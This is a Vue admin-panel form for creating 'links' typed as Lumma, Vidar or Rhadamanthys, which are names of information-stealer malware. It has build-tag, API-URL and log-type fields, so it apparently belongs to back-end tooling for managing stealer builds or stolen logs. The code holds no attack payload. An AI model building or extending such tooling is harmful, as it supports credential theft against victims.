<template>
    <Head title="Create Link" />

    <AdminLayout>
        <div class="mx-auto">
            <h1 class="text-2xl font-bold mb-6">
                <GoBack :href="route('admin.links.index')" />
                Create Link
            </h1>
            <form @submit.prevent="submit" class="bg-white p-6 shadow rounded">
                <div class="flex flex-col sm:flex-row gap-4 mb-4">
                    <!-- Name Field -->
                    <div class="flex-1">
                        <label for="name" class="block text-gray-700 font-medium">Name</label>
                        <input v-model="form.name" type="text" id="name"
                            class="mt-1 block w-full border border-gray-300 rounded-md p-2" />
                        <span v-if="form.errors.name" class="text-red-600 text-sm">
                            {{ form.errors.name }}
                        </span>
                    </div>
                    <!-- Build Tag Field -->
                    <div class="flex-1">
                        <label for="build_tag" class="block text-gray-700 font-medium">Build Tag</label>
                        <input v-model="form.build_tag" type="text" id="build_tag"
                            class="mt-1 block w-full border border-gray-300 rounded-md p-2" />
                        <span v-if="form.errors.build_tag" class="text-red-600 text-sm">
                            {{ form.errors.build_tag }}
                        </span>
                    </div>
                </div>
                <!-- URL Field -->
                <div class="mb-4">
                    <label for="url" class="block text-gray-700 font-medium">URL</label>
                    <textarea v-model="form.url" id="url"
                        class="mt-1 block w-full border border-gray-300 rounded-md p-2"></textarea>
                    <span v-if="form.errors.url" class="text-red-600 text-sm">
                        {{ form.errors.url }}
                    </span>
                </div>
                <div class="flex flex-col sm:flex-row gap-4 mb-4">
                    <!-- Type Field -->
                    <div class="flex-1">
                        <label for="type" class="block text-gray-700 font-medium">Type</label>
                        <select v-model="form.type" id="type" class="mt-1 block w-full border border-gray-300 rounded-md p-2">
                            <option value="lumma">Lumma</option>
                            <option value="vidar">Vidar</option>
                            <option value="rhadamanthys">Rhadamanthys</option>
                        </select>
                        <span v-if="form.errors.type" class="text-red-600 text-sm">
                            {{ form.errors.type }}
                        </span>
                    </div>
                    <!-- Status Field -->
                    <div class="flex-1">
                        <label for="status" class="block text-gray-700 font-medium">Status</label>
                        <select v-model="form.status" id="status"
                            class="mt-1 block w-full border border-gray-300 rounded-md p-2">
                            <option value="active">Active</option>
                            <option value="inactive">Inactive</option>
                        </select>
                        <span v-if="form.errors.status" class="text-red-600 text-sm">
                            {{ form.errors.status }}
                        </span>
                    </div>
                </div>
                <!-- API URL Field -->
                <div class="mb-4" v-if="form.type === 'rhadamanthys'">
                    <label for="api_url" class="block text-gray-700 font-medium">API URL</label>
                    <textarea v-model="form.api_url" id="api_url"
                        class="mt-1 block w-full border border-gray-300 rounded-md p-2"></textarea>
                    <span v-if="form.errors.api_url" class="text-red-600 text-sm">
                        {{ form.errors.api_url }}
                    </span>
                </div>
                <!-- Base Logs Type Field -->
                <div class="mb-4" v-if="form.type === 'rhadamanthys'">
                    <label for="base_logs_type" class="block text-gray-700 font-medium">Base Logs Type</label>
                    <select v-model="form.base_logs_type" id="base_logs_type" class="mt-1 block w-full border border-gray-300 rounded-md p-2">
                        <option value="log">Logs</option>
                        <option value="detailed_log">Detailed Logs</option>
                    </select>
                    <span v-if="form.errors.base_logs_type" class="text-red-600 text-sm">
                        {{ form.errors.base_logs_type }}
                    </span>
                </div>
                <!-- Buttons -->
                <div class="flex flex-col sm:flex-row gap-4">
                    <button type="submit" class="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700">
                        Create
                    </button>
                    <Link :href="route('admin.links.index')"
                        class="px-4 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-700" role="button">
                    Cancel
                    </Link>
                </div>
            </form>
        </div>
    </AdminLayout>
</template>

<script setup>
import GoBack from '@/Components/GoBack.vue';
import AdminLayout from '@/Layouts/AdminLayout.vue';
import { Head, useForm, Link } from '@inertiajs/vue3';

const form = useForm({
    name: '',
    build_tag: '',
    url: '',
    type: 'lumma',
    status: 'active',
    api_url: '',
    base_logs_type: 'log',
});

const submit = () => {
    form.post(route('admin.links.store'));
};
</script>